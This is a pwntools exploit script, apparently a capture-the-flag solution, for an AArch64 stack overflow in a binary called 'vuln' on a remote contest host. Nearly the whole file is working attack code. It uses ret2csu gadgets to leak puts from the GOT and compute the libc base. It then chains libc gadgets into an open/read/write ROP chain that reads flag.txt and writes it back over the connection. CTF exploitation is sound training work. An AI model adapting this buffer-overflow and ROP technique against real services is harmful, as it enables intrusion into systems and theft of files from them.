from pwn import *

context.binary = elf = ELF("./vuln")
libc = ELF("./libc.so.6")
#conn = process()
#conn = process(["strace", "-o", "out", "./vuln"])
#gdb.attach(conn)
conn = remote("fun.eth007.me", 42042)
#context.log_level = 'debug'

'''
https://cor.team/posts/zh3r0-ctf-v2-complete-pwn-writeups/
0x0000000000400948 : ldp x19, x20, [sp, #0x10] ; ldp x21, x22, [sp, #0x20] ; ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret
0x0000000000400928 : ldr x3, [x21, x19, lsl #3] ; mov x2, x24 ; add x19, x19, #1 ; mov x1, x23 ; mov w0, w22 ; blr x3 ; cmp x20, x19; b.ne 0x900; ldp x19, x20, [sp, #0x10]; ldp x19, x20, [sp, #0x10]; ldp x21, x22, [sp, #0x20]; ldp x23, x24, [sp, #0x30]; ldp x29, x30, [sp, #0x40]; ret;
'''

conn.recvuntil(b"below\n")
payload = b"a"*72
payload += p64(0x400948)
payload += p64(0) # x29
payload += p64(0x400928) # x30 (return addr)
payload += p64(0) # x19 --> add 1
payload += p64(1) # x20
payload += p64(elf.got.puts) # x21 --> x3 --> ip
payload += p64(elf.got.puts) # x22 --> w0
payload += p64(0) # x23
payload += p64(0) # x24 --> x2
payload += p64(0) # x29
payload += p64(elf.sym.main) # x30 (return addr)
conn.sendline(payload)

libc.address = u64(conn.recvline()[:-1] + b"\0\0") - libc.sym.puts
info("libc @ " + hex(libc.address))

'''
pop x0:
0x0000000000063e6c : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
pop x1 (clobbers x0):
0x000000000002ddc0 : ldr x1, [sp, #0x18] ; mov x0, x1 ; ldp x29, x30, [sp], #0x20 ; ret
clobber x2:
# this one works too but doesn't give full control... i didn't notice that it actually did work
0x000000000010244c : add x2, x2, x19 ; str x2, [x20, #0x18] ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
# this one allows full control of x2
0x000000000009e3d0 : mov x2, x0 ; cmn x0, #1, lsl #12 ; b.hi #0x9e39c ; ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret
'''

payload = b"a"*72

# gets(libc.bss(42))
payload += p64(libc.address + 0x63e6c)
payload += p64(1) # x29
payload += p64(libc.sym.gets+8) # x30 (next gadget)
payload += p64(0) # padding
payload += p64(libc.bss(42)) # x0

# open(libc.bss(42), 0)
payload += p64(0) # x29
payload += p64(libc.address + 0x2ddc0) # x30 (next gadget)
payload += b"a"*48
payload += p64(0) # x29
payload += p64(libc.address + 0x63e6c) # x30 (next gadget)
payload += p64(0) # padding
payload += p64(0) # x1
payload += p64(0) # x29
payload += p64(libc.sym.open+8) # x30 (next gadget)
payload += p64(0) # padding
payload += p64(libc.bss(42)) # x0

# x0 = 0x100, x2 = x0
payload += p64(0) # x29
payload += p64(libc.address + 0x63e6c) # x30 (next gadget)
payload += b"a"*128
payload += p64(0) # x29
payload += p64(libc.address + 0x9e3d0) # x30 (next gadget)
payload += p64(0) # padding
payload += p64(0x100) # x0

# read(3, libc.bss(42), 0x100)
payload += p64(0) # x29
payload += p64(libc.address + 0x2ddc0) # x30 (next gadget)
payload += b"a"*16
payload += p64(0) # x29
payload += p64(libc.address + 0x63e6c) # x30 (next gadget)
payload += p64(0) # padding
payload += p64(libc.bss(42)) # x1
payload += p64(1) # x29
payload += p64(libc.sym.read+8) # x30 (next gadget)
payload += p64(0) # padding
payload += p64(5) # x0

# write(3, libc.bss(42), 0x100)
payload += p64(0) # x29
payload += p64(libc.address + 0x2ddc0) # x30 (next gadget)
payload += b"a"*32
payload += p64(0) # x29
payload += p64(libc.address + 0x63e6c) # x30 (next gadget)
payload += p64(0) # padding
payload += p64(libc.bss(42)) # x1
payload += p64(1) # x29
payload += p64(libc.sym.write+8) # x30 (next gadget)
payload += p64(0) # padding
payload += p64(1) # x0

conn.sendline(payload)
conn.sendline(b"flag.txt\0".ljust(32, b'\0'))

conn.interactive()
